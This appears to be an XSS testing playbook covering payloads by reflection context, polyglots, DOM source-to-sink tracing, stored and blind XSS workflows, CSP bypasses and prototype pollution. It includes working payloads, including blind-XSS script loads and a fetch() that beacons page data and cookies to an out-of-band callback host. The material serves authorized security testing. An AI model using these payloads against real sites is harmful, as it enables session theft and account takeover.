# XSS contexts, payloads, DOM, stored/blind workflows, CSP, prototype pollution

## 1. Reflection contexts and break-outs

Find your marker in the raw response (`curl -s "https://example.com/s?q=XSSMARK7" | grep -n XSSMARK7`)
and read the surrounding HTML. The context dictates the payload.

### HTML body — `<p>INPUT</p>`
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```
If `<script>` is filtered but other tags pass, event-handler tags (`img`, `svg`, `details`,
`video`, `iframe srcdoc`) are the move. Case/whitespace mutations beat naive filters:
`<ScRiPt>`, `<img/src=x onerror=alert(1)>`, `<svg%0aonload=alert(1)>`.

### HTML comment — `<!-- INPUT -->`
```
--><script>alert(1)</script><!--
```

### Quoted attribute — `<input value="INPUT">`
```
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
"><img src=x onerror=alert(1)>
```
Single-quoted: same with `'`. If `<` `>` are encoded but quotes survive, stay inside the
tag with an event handler.

### Unquoted attribute — `<input value=INPUT>`
```
x onmouseover=alert(1)
x/onerror=alert(1)
```
Any whitespace (or `/`) starts a new attribute — no quotes needed.

### URL attribute — `<a href="INPUT">`, `<iframe src="INPUT">`
```
javascript:alert(1)
javascript:alert(document.domain)//
JaVaScRiPt:alert(1)
java%09script:alert(1)
```
`data:text/html,<script>alert(1)</script>` works in `iframe src` (not `a href` in modern
browsers).

### JS string — `<script>var q = 'INPUT';</script>`
```
';alert(1);//
'-alert(1)-'
\';alert(1);//          (when ' is escaped to \' but \ is not doubled)
</script><script>alert(1)</script>   (HTML parser wins: closes the script block regardless of JS string state)
```
Double-quoted string: same with `"`. Template literal `` `INPUT` ``: `${alert(1)}`.
Inside a JS value that gets `eval`'d or `JSON.parse`'d, break the structure accordingly.

### CSS — `<style>...INPUT...</style>` or `style="...INPUT..."`
```
</style><script>alert(1)</script>
```
Pure-CSS execution is dead in modern browsers; CSS injection is still an exfil channel
(attribute-selector token theft) — note it, classify separately.

## 2. Polyglots

First manual shot when context is unknown — fires across many contexts:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```
(0xsobky's "ultimate polyglot".) Shorter all-rounder:
```
'"--></style></script><svg onload=alert(1)>
```
Use `alert(document.domain)` instead of `alert(1)` in PoCs — it proves the execution origin,
which matters when the reflection might land in a sandboxed/other-origin frame.

## 3. DOM-based XSS (WSTG-CLNT-01)

**Sources** (attacker-controlled input readable by JS):
`location` (`.href .search .hash .pathname`), `document.URL`, `document.documentURI`,
`document.referrer`, `window.name`, `postMessage` event data, `localStorage`/`sessionStorage`
(second-order), `document.cookie`, WebSocket/XHR responses from attacker-influenced endpoints.

**Sinks** (execute/render):
- HTML rendering: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`/`writeln`,
  jQuery `.html()`, `.append()`, `$(...)` with HTML, `DOMParser` + insert.
- JS execution: `eval`, `Function`, `setTimeout`/`setInterval` with string arg,
  `script.src`, `script.text`.
- Navigation: `location =`, `location.href/assign/replace` (→ `javascript:` URLs),
  `window.open`, `a.href` then auto-click.
- Attribute: `element.setAttribute('on*'/'src'/'href', ...)`, `iframe.srcdoc`.

**Workflow:**
1. Grep the app's JS (and inline scripts) for sinks: `curl -s URL | grep -nE 'innerHTML|document\.write|eval\(|location\.(hash|search)'`; for bundles, pull sources from devtools.
2. In devtools, break on the sink (or use "Break on → subtree modification"), load the page
   with a marker in each source (`#XSSMARK7`, `?x=XSSMARK7`, `window.name` via an opener),
   and trace whether it reaches the sink un-sanitized.
3. Exploit via the matching source: fragment payloads never hit the server —
   `https://example.com/page#<img src=x onerror=alert(document.domain)>` for a
   `location.hash → innerHTML` flow; `javascript:alert(1)` for `hash → location` flows;
   a hosting page doing `frame.postMessage(payload,'*')` for message handlers with no
   origin check.
4. dalfox's DOM mining and `--deep-scan`, XSStrike's DOM report, and Burp DOM Invader all
   accelerate step 1–2.

## 4. Stored XSS workflow (WSTG-INPV-02)

1. **Enumerate persistence points**: profile fields, comments, posts, messages, filenames,
   file *content* (SVG! `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>`),
   HTTP headers that get logged/rendered (User-Agent, Referer, X-Forwarded-For), support
   tickets, order notes, imported data (CSV/XML).
2. **Seed unique markers** per field: `xss-profile-bio-k3j9`, `xss-ua-k3j9`... so render
   locations map back to injection points unambiguously.
3. **Find render surfaces**: crawl as the injecting user, as other users, and as admin
   (ask for / create a second account); markers appearing unencoded = candidate.
4. **Re-inject context-correct payloads** at the mapped points, confirm execution at the
   render URL (browser or dalfox `--sxss --sxss-url`).
5. Evidence = the injection request + the render response showing the live payload. Severity
   is usually ≥ reflected (victim needs no crafted link); admin-panel rendering → critical.
6. Clean up test payloads where the platform expects it (markers make them findable).

## 5. Blind XSS

For render surfaces you can't see (admin dashboards, log viewers, CRM, ticket systems):

1. `interactsh-client -json -o oast.jsonl` → note your `<id>.oast.pro` domain. (XSS Hunter
   Express is the alternative with full DOM/cookie/screenshot capture.)
2. Payloads that phone home:
   ```html
   "><script src=https://f1.<id>.oast.pro></script>
   <img src=x onerror=import('https://f2.<id>.oast.pro')>
   javascript:eval('var a=document.createElement(\'script\');a.src=\'https://f3.<id>.oast.pro\';document.body.appendChild(a)')
   ```
   Use a **unique subdomain prefix per injection point** (`f1`, `f2`, ...) so a callback
   identifies the field.
3. Inject into contact forms, usernames, User-Agent/Referer, ticket subjects, error-page
   paths, anything an operator later views. dalfox automates: `-b https://<id>.oast.pro`.
4. Watch `oast.jsonl` for `http` interactions: `full-id` prefix → injection point;
   `remote-address` + request headers → victim browser/host; delay → when the surface was
   viewed. A DNS-only interaction means CSP or the context blocked the script fetch but the
   URL was processed — still evidence of injection.
5. For a full-impact PoC, serve a script that beacons back `document.domain`, `location.href`
   and `document.cookie` (interactsh shows the query string of callbacks:
   `fetch('https://<id>.oast.pro/?d='+btoa(document.domain+'|'+location.href))`).

## 6. CSP-aware exploitation

Read `Content-Security-Policy` from the response first (`curl -sI`). Common holes:

- **No CSP / CSP without `script-src`** → nothing changes.
- **`'unsafe-inline'`** in script-src → inline payloads work as normal.
- **`'unsafe-eval'`** → `eval`/`Function`/string `setTimeout` sinks exploitable even if
  inline is blocked.
- **Whitelisted CDN with JSONP or AngularJS** →
  `<script src="https://whitelisted-cdn.example.net/jsonp?callback=alert(1)"></script>`, or
  load AngularJS from the whitelisted host and use a client-side template injection
  (`{{constructor.constructor('alert(1)')()}}` inside an `ng-app` scope).
- **`strict-dynamic`** → find any script-creating gadget already on the page; also,
  nonce reuse across responses or nonce reflected into your injection point = game over.
- **Missing `base-uri`** → `<base href="https://203.0.113.10/">` hijacks relative script srcs.
- **Missing `object-src`** with legacy plugins, or `data:` in script-src → `data:` script URLs.
- **`report-uri` only / Report-Only header** → policy not enforced; note it, exploit normally.

Evaluate the policy with Google's CSP Evaluator logic; include the policy header and the
bypass used in the finding evidence. If CSP genuinely blocks execution, the unencoded
reflection is still a finding (CWE-79, reduced severity) — CSP is mitigation, not a fix.

## 7. Prototype pollution (adjacent class — pointer)

Client-side: if URL params/JSON reach a recursive merge/extend (`?__proto__[x]=y`,
`?constructor[prototype][x]=y`, body `{"__proto__":{"x":"y"}}`), check `window.x` /
`Object.prototype.x` in the console. Then hunt **script gadgets**: library code that reads
a now-polluted property into a sink (classic: polluting `innerHTML`-adjacent config in
jQuery, Vue, Google Analytics loaders → XSS). Tools: **ppmap** (automated pollution → gadget
→ XSS chains), **pp-finder** (static gadget hunting in JS), Burp **DOM Invader** (prototype
pollution mode). Server-side variant (Node): pollution via JSON body → RCE/logic gadgets.
Classify CWE-1321; if it yields script execution, also CWE-79. Report via the same
`findings.report` flow with the polluting request + the gadget evidence.
